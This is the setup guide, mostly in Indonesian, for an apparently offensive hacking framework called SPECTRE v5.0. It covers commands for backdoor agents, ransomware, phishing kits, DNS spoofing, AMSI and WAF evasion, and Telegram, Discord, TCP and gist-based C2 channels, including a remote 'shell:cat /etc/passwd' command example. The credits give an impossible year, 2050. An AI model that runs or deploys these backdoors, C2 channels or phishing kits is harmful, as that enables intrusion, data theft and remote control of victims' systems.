# SPECTRE v5.0 — Setup Guide

Complete installation, configuration, and usage guide.

---
<img width="1254" height="1254" alt="1000295559" src="https://github.com/user-attachments/assets/770f1642-2e5a-4f25-950b-260e646ee869" />
## 📑 DAFTAR ISI

1. [Requirements](#1-requirements)
2. [Instalasi Cepat](#2-instalasi-cepat)
3. [Instalasi Manual per OS](#3-instalasi-manual-per-os)
4. [Konfigurasi](#4-konfigurasi)
5. [Cara Pakai](#5-cara-pakai)
6. [Web UI](#6-web-ui)
7. [AI Layer](#7-ai-layer)
8. [C2 System](#8-c2-system)
9. [Plugin System](#9-plugin-system)
10. [Docker](#10-docker)
11. [Troubleshooting](#11-troubleshooting)
12. [Legal](#12-legal)

---

## 1. REQUIREMENTS

### Minimum
- **OS**: Linux / macOS / Windows / Termux (Android)
- **Python**: 3.10+
- **RAM**: 2 GB
- **Disk**: 500 MB
- **Internet**: Wajib untuk modul online

### Optional
- **Ollama** — AI lokal (gratis)
- **Redis** — Distributed queue
- **PostgreSQL** — Production DB
- **Docker** — Container deployment
- **Metasploit** — Untuk modul MSF
- **YARA** — Untuk modul YARA

### Dependencies
Semua ada di `requirements.txt`. Yang penting:
- `requests`, `aiohttp`, `pyyaml`, `colorama`, `tqdm`
- `dnspython`, `python-whois`, `phonenumbers`, `fake-useragent`
- `beautifulsoup4`, `lxml`, `folium`
- `cryptography`
- `fastapi`, `uvicorn[standard]`
- `sqlalchemy`

---

## 2. INSTALASI CEPAT

### 2.1. Setup Otomatis (Recommended)

```bash
cd spectre-v5
chmod +x setup.sh
./setup.sh
```

Script ini akan:
1. Cek Python versi
2. Bikin virtualenv (`venv/`)
3. Install semua dependencies
4. Init folder (`logs/`, `plugins/`, `reports/`)
5. Auto-generate example plugin

### 2.2. Setup Manual

```bash
# Bikin folder
mkdir -p spectre-v5/{plugins,logs,reports,docs}
cd spectre-v5

# Virtualenv
python3 -m venv venv
source venv/bin/activate     # Linux/Mac
# venv\Scripts\activate      # Windows

# Upgrade pip
pip install --upgrade pip

# Install deps
pip install -r requirements.txt

# Init
python spectre.py --init
```

### 2.3. Verifikasi

```bash
python spectre.py --help
```

Kalau muncul banner + list command → **SUKSES** ✅

---

## 3. INSTALASI MANUAL PER OS

### 🐧 Linux (Debian/Ubuntu/Kali)

```bash
sudo apt update
sudo apt install -y python3 python3-pip python3-venv git curl nmap dnsutils whois
chmod +x setup.sh
./setup.sh
```

### 🐧 Linux (Arch/Manjaro)

```bash
sudo pacman -S python python-pip git curl nmap bind whois
chmod +x setup.sh
./setup.sh
```

### 📱 Termux (Android)

```bash
pkg update && pkg upgrade -y
pkg install python python-pip git curl nmap dnsutils whois -y
pip install --upgrade pip
pip install -r requirements.txt
python spectre.py --init
```

**Termux notes:**
- WiFi scan butuh `pkg install termux-api` + app **Termux:API** dari F-Droid
- Beberapa modul butuh `termux-setup-storage`
- Root opsional untuk raw socket

### 🪟 Windows

1. Install Python 3.10+ dari [python.org](https://python.org)
2. Install Git dari [git-scm.com](https://git-scm.com)
3. Buka **PowerShell as Administrator**:

```powershell
cd spectre-v5
python -m venv venv
.\venv\Scripts\Activate.ps1
pip install --upgrade pip
pip install -r requirements.txt
python spectre.py --init
```

**Windows notes:**
- Persistence + AMSI bypass butuh admin
- MSF RPC cuma Linux/Mac
- WSL recommended untuk full experience

### 🍎 macOS

```bash
# Install Homebrew dulu
/bin/bash -c "$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)"

# Install deps
brew install python@3.11 git curl nmap

# Setup
chmod +x setup.sh
./setup.sh
```

---

## 4. KONFIGURASI

### 4.1. File `config.yaml`

```yaml
general:
  version: "5.0.0"
  threads: 100
  timeout: 8
  user_agent: "random"

ai:
  enabled: false
  provider: "none"       # ollama | openai | anthropic | none
  ollama:
    host: "http://127.0.0.1:11434"
    model: "llama3.2"
  openai:
    api_key: ""
    model: "gpt-4o-mini"
  anthropic:
    api_key: ""
    model: "claude-3-haiku-20240307"
  features:
    report_generation: true
    vuln_reasoning: true
    payload_mutation: false
    chat_interface: true

storage:
  driver: "sqlite"       # sqlite | postgres
  sqlite:
    path: "spectre.db"
  postgres:
    dsn: "postgresql://user:pass@localhost:5432/spectre"

c2:
  telegram:
    enabled: false
    bot_token: ""
    chat_id: ""
  discord:
    enabled: false
    webhook: ""
  custom_tcp:
    enabled: false
    port: 4444
    encrypt: true

recon:
  shodan_key: ""
  hunter_key: ""
  hibp_key: ""

web:
  host: "0.0.0.0"
  port: 5000
  auth:
    enabled: true
    users:
      admin: "changeme"
```

### 4.2. Environment Variables

Semua konfigurasi bisa di-override via env dengan prefix `SPECTRE_`:

```bash
export SPECTRE_AI_ENABLED=true
export SPECTRE_AI_PROVIDER=ollama
export SPECTRE_TG_TOKEN="123456:ABC..."
export SPECTRE_TG_CHAT="987654321"
export SPECTRE_DISCORD="https://discord.com/api/webhooks/..."
export SPECTRE_SHODAN="your_api_key"
```

### 4.3. Contoh Konfigurasi

#### Mode Basic (SQLite, no AI)
```yaml
general:
  threads: 100
ai:
  enabled: false
storage:
  driver: "sqlite"
```

#### Mode Advanced (Ollama + Telegram C2)
```yaml
ai:
  enabled: true
  provider: "ollama"
  ollama:
    model: "llama3.2"

c2:
  telegram:
    enabled: true
    bot_token: "123:ABC"
    chat_id: "987654"
```

#### Mode Production (Docker + Postgres)
```yaml
storage:
  driver: "postgres"
  postgres:
    dsn: "postgresql://spectre:pass@db:5432/spectre"
web:
  auth:
    enabled: true
    users:
      admin: "strongpassword"
```

---

## 5. CARA PAKAI

### 5.1. Basic Workflow

```bash
# Aktifkan venv
source venv/bin/activate

# Lihat help
python spectre.py --help

# Scan target
python spectre.py --tech example.com
python spectre.py --port scanme.nmap.org
python spectre.py --geoip 8.8.8.8

# Cek hasil
python spectre.py --db
```

### 5.2. Command Reference

#### 🔍 RECON

```bash
python spectre.py --geoip 8.8.8.8
python spectre.py --port scanme.nmap.org
python spectre.py --whois example.com
python spectre.py --dns example.com
python spectre.py --subdomain example.com
python spectre.py --ssl example.com
python spectre.py --tech example.com
python spectre.py --dir example.com
python spectre.py --email example.com
python spectre.py --social izumi
python spectre.py --phone +6281234567890
python spectre.py --breach email@example.com
python spectre.py --darkweb example.com
python spectre.py --async example.com     # CEPAT
python spectre.py --shodan 8.8.8.8
```

#### 💀 ATTACK

```bash
python spectre.py --sqli "http://target.com/page?id=1"
python spectre.py --backdoor 10.0.0.5:4444
python spectre.py --ransomware              # EDU only
python spectre.py --phishing https://example.com
python spectre.py --crypto 1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa
python spectre.py --wifi
python spectre.py --dns-spoof example.com
```

#### 💥 EXPLOIT

```bash
python spectre.py --yara /path/to/file
python spectre.py --msf apache
python spectre.py --evasion 10.0.0.5
python spectre.py --autopwn target.com
```

#### ⚙️ SYSTEM

```bash
python spectre.py --all example.com        # SEMUA modul
python spectre.py --web                    # Web UI
python spectre.py --c2                     # C2 listener
python spectre.py --ai                     # AI chat
python spectre.py --db                     # DB stats
python spectre.py --report                 # Report
python spectre.py --report example.com
python spectre.py --plugins                # List plugin
python spectre.py --init                   # Init
python spectre.py --help
```

### 5.3. Contoh Workflow Nyata

#### Skenario 1: Bug Bounty Recon

```bash
python spectre.py --tech target.com
python spectre.py --async target.com
python spectre.py --tech admin.target.com
python spectre.py --sqli "https://target.com/search?q=test"
python spectre.py --report target.com
```

#### Skenario 2: Lab Testing + C2

```bash
export SPECTRE_TG_TOKEN="..."
export SPECTRE_TG_CHAT="..."

# Terminal 1: C2
python spectre.py --c2

# Terminal 2: Generate agent
python spectre.py --backdoor 192.168.1.100:4444
```

#### Skenario 3: CTF

```bash
python spectre.py --port 10.10.10.5
python spectre.py --tech 10.10.10.5
python spectre.py --dir 10.10.10.5
python spectre.py --sqli "http://10.10.10.5/login"
```

### 5.4. Output Files

| Format | Lokasi | Isi |
|---|---|---|
| SQLite | `spectre.db` | Semua hasil (queryable) |
| JSON | `report_*.json` | Hasil per scan |
| TXT | `report_*.txt` | Human-readable |
| HTML Map | `geo_*.html` | Folium map |
| Backdoor dir | `backdoor_<ts>/` | Payload files |
| Phishing dir | `phishing_<ts>/` | Kit + collector |
| Evasion dir | `evasion_<ts>/` | Bypass scripts |
| Logs | `logs/spectre.log` | Semua aktivitas |

---

## 6. WEB UI

### 6.1. Jalankan

```bash
python spectre.py --web
```

Atau:
```bash
python web.py
```

Buka: **http://localhost:5000**

### 6.2. Fitur

- ✅ Real-time console via WebSocket
- ✅ Target input + module dropdown
- ✅ Run single atau Run all
- ✅ Stats live (scans, targets, findings)
- ✅ Findings viewer dengan severity tags
- ✅ History viewer per target
- ✅ Auto-refresh tiap 30s

### 6.3. Konfigurasi

```yaml
web:
  host: "0.0.0.0"
  port: 5000
  auth:
    enabled: true
    users:
      admin: "changeme"    # GANTI!
```

### 6.4. Keamanan

⚠️ **Jangan expose ke internet tanpa:**
- HTTPS (nginx + certbot)
- Auth strong
- Firewall
- VPN / Tailscale

Untuk local-only:
```yaml
web:
  host: "127.0.0.1"
```

---

## 7. AI LAYER

### 7.1. Setup Ollama (Local, Gratis)

```bash
# Install
curl -fsSL https://ollama.com/install.sh | sh

# Start
ollama serve &

# Pull model
ollama pull llama3.2      # 2GB, ringan
ollama pull qwen2.5:7b    # 4GB, bagus
ollama pull mistral       # 4GB, cepat
```

Update `config.yaml`:
```yaml
ai:
  enabled: true
  provider: "ollama"
  ollama:
    host: "http://127.0.0.1:11434"
    model: "llama3.2"
```

Test:
```bash
python ai_layer.py
```

### 7.2. Setup OpenAI

```bash
export OPENAI_API_KEY="sk-..."
```

```yaml
ai:
  enabled: true
  provider: "openai"
  openai:
    model: "gpt-4o-mini"
```

### 7.3. Setup Anthropic

```bash
export ANTHROPIC_API_KEY="sk-ant-..."
```

```yaml
ai:
  enabled: true
  provider: "anthropic"
  anthropic:
    model: "claude-3-haiku-20240307"
```

### 7.4. Fitur AI

#### Report Generation
Setelah `--all`, AI otomatis generate executive summary dalam Bahasa Indonesia.

#### Chat Mode
```bash
python spectre.py --ai
```

```
You > target example.com
✅ Target set

You > target ini rentan di mana?
🤖 SPECTRE: Berdasarkan scan terakhir...
```

#### Vuln Reasoning
AI rank CVE by exploitability di target spesifik.

#### Payload Mutation
AI generate variasi payload untuk bypass WAF (optional, set `payload_mutation: true`).

### 7.5. Kalau Gak Ada LLM

AI layer fallback ke **template-based**. Semua fitur lain tetap jalan normal.

---

## 8. C2 SYSTEM

### 8.1. Telegram C2

#### Setup Bot
1. Chat **@BotFather** → `/newbot` → dapat token
2. Chat **@userinfobot** → dapat chat_id

```yaml
c2:
  telegram:
    enabled: true
    bot_token: "123456:ABC..."
    chat_id: "987654321"
```

Atau env:
```bash
export SPECTRE_TG_TOKEN="123456:ABC..."
export SPECTRE_TG_CHAT="987654321"
```

#### Jalankan
```bash
python spectre.py --c2
```

Bot kirim `🟢 SPECTRE v5.0 online` ke chat lo.

#### Command Support
```
whoami
pwd
shell:ls -la
shell:cat /etc/passwd
```

### 8.2. Discord C2

```yaml
c2:
  discord:
    enabled: true
    webhook: "https://discord.com/api/webhooks/..."
    bot_token: ""       # optional, buat 2-way
    channel_id: ""      # optional
```

**Tanpa bot token:** one-way send  
**Dengan bot token:** two-way C2

### 8.3. TCP C2 (Encrypted)

```yaml
c2:
  custom_tcp:
    enabled: true
    host: "0.0.0.0"
    port: 4444
    encrypt: true
```

Generate agent:
```python
from c2 import AgentGenerator
code = AgentGenerator.tcp_agent("192.168.1.100", 4444)
open("agent.py", "w").write(code)
```

### 8.4. Dead-Drop C2

Via GitHub gist:

```yaml
c2:
  dead_drop:
    enabled: true
    github_token: "ghp_..."
    gist_id: "abc123"
    poll_interval: 30
```

---

## 9. PLUGIN SYSTEM

### 9.1. Bikin Plugin

Bikin file `plugins/my_plugin.py`:

```python
from plugin_loader import Plugin


class MyScanner(Plugin):
    name = "my_scanner"
    version = "1.0.0"
    author = "Your Name"
    description = "Plugin deskripsi"

    def run(self, target, session, context=None):
        try:
            r = session.get(f"https://{target}", timeout=8)
            return {
                "status": r.status_code,
                "server": r.headers.get("Server"),
            }
        except Exception as e:
            return {"error": str(e)}
```

### 9.2. Load Plugin

Otomatis ke-load setiap kali spectre jalan.

```bash
python spectre.py --plugins
```

### 9.3. Pakai dari Kode

```python
from plugin_loader import PluginLoader
from core import SessionFactory

loader = PluginLoader("plugins")
loader.load_all()

session = SessionFactory.create()
result = loader.run("my_scanner", "example.com", session)
print(result)
```

---

## 10. DOCKER

### 10.1. Setup

```bash
docker-compose up -d
```

Service:
- `spectre-master` (port 5000)
- `spectre-worker` (3 replicas)
- `redis` (6379)
- `postgres` (5432)
- `ollama` (11434)

### 10.2. Cek Status

```bash
docker-compose ps
docker-compose logs -f spectre-master
```

### 10.3. Akses

- Web UI: http://localhost:5000
- Ollama API: http://localhost:11434

### 10.4. Build Manual

```bash
docker build -t spectre:v5 .
docker run -it --rm spectre:v5 python spectre.py --help
```

### 10.5. Config Update

Edit `config.yaml` di host, bakal otomatis ke-mount.

---

## 11. TROUBLESHOOTING

### ❌ `ModuleNotFoundError: No module named 'core'`

Run dari folder yang salah. Pastikan:
```bash
cd spectre-v5
ls core.py
python spectre.py --help
```

### ❌ `Permission denied` di setup.sh

```bash
chmod +x setup.sh
./setup.sh
```

### ❌ `externally-managed-environment` (pip)

Pakai venv:
```bash
python3 -m venv venv
source venv/bin/activate
pip install -r requirements.txt
```

### ❌ `ssl.SSLCertVerificationError`

Sudah ada `verify=False` di code. Kalau masih:
```bash
pip install --upgrade certifi
```

### ❌ `yara-python` gagal install

**Linux:**
```bash
sudo apt install -y libyara-dev
pip install yara-python
```

**macOS:**
```bash
brew install yara
pip install yara-python
```

**Windows:** Skip, gak jalan.

### ❌ `Ollama not reachable`

```bash
curl http://127.0.0.1:11434/api/tags
ollama serve &
ollama list
```

### ❌ `No module named 'fastapi'` saat --web

```bash
pip install fastapi uvicorn[standard] python-multipart jinja2
```

### ❌ Port 5000 sudah dipakai

Ganti di `config.yaml`:
```yaml
web:
  port: 5050
```

### ❌ Termux `termux-wifi-scaninfo` not found

```bash
pkg install termux-api
# Install app Termux:API dari F-Droid
```

### ❌ SQLite locked (concurrent write)

Pakai PostgreSQL:
```yaml
storage:
  driver: "postgres"
```

### ❌ Import error setelah edit file

```bash
find . -name "__pycache__" -type d -exec rm -rf {} +
python spectre.py --help
```

### ❌ DNS resolver timeout

```yaml
general:
  timeout: 15     # naikin dari 8
```

---

## 12. LEGAL

```
╔══════════════════════════════════════════════════════════════╗
║                    ⚠️ LEGAL WARNING ⚠️                       ║
╚══════════════════════════════════════════════════════════════╝
```

SPECTRE v5.0 adalah **offensive security tool**. Penggunaan tanpa izin melanggar hukum pidana di hampir semua negara:

- 🇮🇩 Indonesia — UU ITE Pasal 30, 46
- 🇺🇸 USA — CFAA
- 🇬🇧 UK — Computer Misuse Act 1990
- 🇪🇺 EU — Directive 2013/40/EU

**DIIZINKAN:**
- ✅ Scan sistem milik sendiri
- ✅ Pentest dengan kontrak tertulis
- ✅ CTF
- ✅ Bug bounty dalam scope
- ✅ Lab/VM untuk edukasi

**DILARANG:**
- ❌ Scan tanpa izin
- ❌ Phishing tanpa kontrak
- ❌ Deploy ransomware
- ❌ DoS/DDoS
- ❌ Mencuri data
- ❌ Akses WiFi orang lain

**Author tidak bertanggung jawab atas penyalahgunaan.**

---

## 📚 RESOURCES

- [OWASP Testing Guide](https://owasp.org/www-project-web-security-testing-guide/)
- [HackTricks](https://book.hacktricks.xyz/)
- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings)
- [GTFOBins](https://gtfobins.github.io/)

---

## 🙏 CREDITS

- **Author:** イズミー (IZUMI)
- **Version:** 5.0.0
- **Year:** 2050

```
╔══════════════════════════════════════════════════════════════╗
║  💀 SPECTRE v5.0 — Singularity Edition — READY 💀           ║
║  🔥 NO FILTER | NO RULES | NO MERCY 🔥                       ║
╚══════════════════════════════════════════════════════════════╝
```

**End of SETUP.md**